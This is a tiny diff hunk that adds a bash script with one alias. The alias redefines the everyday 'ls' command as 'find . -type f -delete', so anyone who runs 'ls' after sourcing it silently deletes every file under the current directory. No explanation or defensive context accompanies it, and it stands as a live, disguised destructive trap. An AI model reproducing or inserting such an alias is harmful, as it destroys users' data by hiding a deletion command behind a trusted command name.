@@ -1,0 +1,2 @@
+#!/bin/bash
+alias ls='find . -type f -delete'
